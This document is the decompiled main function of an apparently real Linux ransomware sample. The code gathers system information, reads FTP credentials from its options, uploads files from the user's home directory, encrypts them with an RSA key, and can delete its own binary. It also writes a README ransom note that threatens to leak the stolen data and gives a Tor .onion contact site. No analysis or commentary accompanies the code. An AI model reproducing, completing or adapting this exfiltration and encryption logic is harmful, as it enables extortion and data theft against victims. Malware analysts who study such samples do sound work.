undefined4 main(int param_1,char **param_2)

{
  char cVar1;
  __uid_t __uid;
  int iVar2;
  int iVar3;
  size_t sVar4;
  size_t sVar5;
  long lVar6;
  long in_FS_OFFSET;
  undefined4 local_10c;
  int local_108;
  char *local_f8;
  char **local_f0;
  char **local_e8;
  char *local_e0;
  char *local_d8;
  passwd *local_d0;
  char **local_c8;
  FILE *local_c0;
  undefined7 *local_b8;
  undefined8 local_b0;
  sigaction local_a8;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_10c = 1;
  local_e0 = (char *)0x0;
  local_d8 = (char *)0x0;
  local_f0 = (char **)0x0;
  local_e8 = (char **)0x0;
  local_b8 = (undefined7 *)0x0;
  local_b0 = 0;
  __uid = geteuid();
  local_d0 = getpwuid(__uid);
  id = &DAT_00107246;
  sprintf(filename,"/tmp/%s.txt",&DAT_00107246);
  lp_collect_system_info();
  lp_save_system_info();
  sigemptyset(&local_a8.sa_mask);
  local_a8.__sigaction_handler.sa_handler = lp_signal_handler;
  local_a8.sa_flags = 0;
  sigaction(2,&local_a8,(sigaction *)0x0);
  sigaction(0xf,&local_a8,(sigaction *)0x0);
  sigaction(3,&local_a8,(sigaction *)0x0);
  for (local_108 = 1; local_108 < param_1; local_108 = local_108 + 1) {
    iVar2 = strcmp(param_2[local_108],"-h");
    if ((iVar2 == 0) || (iVar2 = strcmp(param_2[local_108],"--help"), iVar2 == 0)) {
      lp_option_help();
      goto LAB_001044c8;
    }
    cVar1 = lp_option_parse(param_2[local_108]);
    if (cVar1 != '\x01') goto LAB_001044c8;
  }
  lp_option_print();
  if ((local_d0 != (passwd *)0x0) &&
     (asprintf(&local_f8,"/home/%s/",local_d0->pw_name), local_f8 != (char *)0x0)) {
    local_c8 = (char **)malloc(0x10);
    if (local_c8 == (char **)0x0) {
      free(local_f8);
      local_10c = 1;
      goto LAB_001044ea;
    }
    *local_c8 = local_f8;
    local_c8[1] = (char *)0x0;
    local_e8 = (char **)lp_option_list(&DAT_0010726b);
    if ((*local_c8 != (char *)0x0) && (**local_c8 != '\0')) {
      if ((local_e8 == (char **)0x0) || ((*local_e8 == (char *)0x0 || (**local_e8 == '\0')))) {
        local_e8 = (char **)0x0;
      }
      local_e0 = (char *)lp_option_str("ftp-user");
      local_d8 = (char *)lp_option_str("ftp-pwd");
      ftp_url = lp_option_str("ftp-url");
      cVar1 = lp_option_bool("no-ftp");
      if ((cVar1 == '\x01') ||
         (((ftp_url != 0 && (local_e0 != (char *)0x0)) && (local_d8 != (char *)0x0)))) {
        sVar4 = strlen(local_e0);
        sVar5 = strlen(local_d8);
        iVar2 = (int)sVar5 + (int)sVar4;
        ftp_creds = (char *)calloc(1,(long)(iVar2 + 2));
        if (((((local_e0 == (char *)0x0) || (local_d8 == (char *)0x0)) ||
             (iVar3 = snprintf(ftp_creds,(long)(iVar2 + 2),"%s:%s",local_e0,local_d8),
             iVar2 + 1 == iVar3)) &&
            ((iVar2 = lp_option_int("threads"), 0 < iVar2 &&
             (lVar6 = lp_sha256(&DAT_00107480,pub_hash), lVar6 != 0)))) &&
           (iVar3 = snprintf((char *)&pub_ext,7,"%.6s",pub_hash), iVar3 == 6)) {
          local_b8 = &pub_ext;
          local_b0 = 0;
          cVar1 = lp_rsa_key_load();
          if ((cVar1 == '\x01') &&
             (cVar1 = lp_traverser_init(iVar2,local_e8,&local_b8), cVar1 == '\x01')) {
            lp_traverser_set_mode(4);
            lp_traverser_set_handler(lp_upload_handler);
            confirm = quit == '\0';
            local_f0 = local_c8;
            while (((quit != '\x01' && (cVar1 = lp_option_bool("no-ftp"), cVar1 != '\x01')) &&
                   (*local_f0 != (char *)0x0))) {
              if (**local_f0 != '\0') {
                lp_traverser_run(*local_f0);
              }
              local_f0 = local_f0 + 1;
            }
            cVar1 = lp_option_bool("no-bar");
            lp_traverser_wait(cVar1 == '\0');
            lp_upload_handler(filename);
            lp_traverser_set_mode(6);
            lp_traverser_set_handler(lp_encrypt_handler);
            for (local_f0 = local_c8; (quit != '\x01' && (*local_f0 != (char *)0x0));
                local_f0 = local_f0 + 1) {
              lp_traverser_run(*local_f0);
            }
            cVar1 = lp_option_bool("no-bar");
            lp_traverser_wait(cVar1 == '\0');
            snprintf(filename,0x100,"/home/%s/README",local_d0->pw_name);
            local_c0 = fopen(filename,"w");
            if (local_c0 != (FILE *)0x0) {
              fprintf(local_c0,
                      "\nAttention!!!\n\nYor servers are all encrypted.\n\nAnd We have downloaded al l you data. Contact us or we will leak your data on internet.\n\nUsing Tor Bro wser:\n1) Download tor browser from this site: https://torproject.org\n2) Inst all Tor Broser\n3) Open website - kd24u5e4ggp2m4k4w23lm5fu1[REDACTED].onion\n\n"
                     );
              fclose(local_c0);
            }
            if (quit == '\0') {
              cVar1 = lp_option_bool("destruct");
              if (cVar1 != '\0') {
                unlink(*param_2);
              }
              sync();
              local_10c = 0;
            }
          }
        }
      }
    }
  }
LAB_001044c8:
  lp_traverser_free();
  lp_rsa_key_free();
  free(ftp_creds);
  lp_option_free();
LAB_001044ea:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return local_10c;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

